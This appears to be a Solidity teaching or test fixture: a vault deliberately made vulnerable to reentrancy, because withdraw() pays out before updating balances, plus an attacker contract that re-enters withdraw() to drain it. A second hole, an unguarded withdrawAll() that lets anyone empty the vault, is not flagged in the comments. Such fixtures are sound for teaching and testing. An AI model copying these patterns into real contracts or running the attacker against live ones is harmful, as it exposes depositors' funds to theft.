// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title ReentrancyVault
 * @notice Deliberately vulnerable vault. withdraw() transfers ETH to the
 *         caller BEFORE decrementing the caller's balance, so a malicious
 *         receiver can re-enter withdraw() and drain the pool.
 *
 * Vulnerability class: reentrancy (checks-effects-interactions violation).
 */
contract ReentrancyVault {
    mapping(address => uint256) public balances;
    uint256 public totalDeposited;
    uint256 public totalWithdrawn;

    event Deposit(address indexed who, uint256 amount);
    event Withdrawal(address indexed who, uint256 amount);

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposited += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /// @dev VULNERABLE: external call precedes the state update.
    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "nothing to withdraw");

        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
        totalWithdrawn += bal;
        emit Withdrawal(msg.sender, bal);
    }

    function withdrawAll(address payable to) external {
        (bool ok,) = to.call{value: address(this).balance}("");
        require(ok, "transfer failed");
    }
}

/**
 * @title ReentrancyAttacker
 * @notice Re-enters the vault's withdraw() from its receive() hook.
 */
contract ReentrancyAttacker {
    ReentrancyVault public immutable vault;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor(ReentrancyVault v) {
        vault = v;
    }

    function attack(uint256 depth) external payable {
        maxReentries = depth;
        reentries = 0;
        vault.deposit{value: address(this).balance}();
        vault.withdraw();
    }

    receive() external payable {
        if (reentries < maxReentries) {
            reentries += 1;
            vault.withdraw();
        }
    }
}
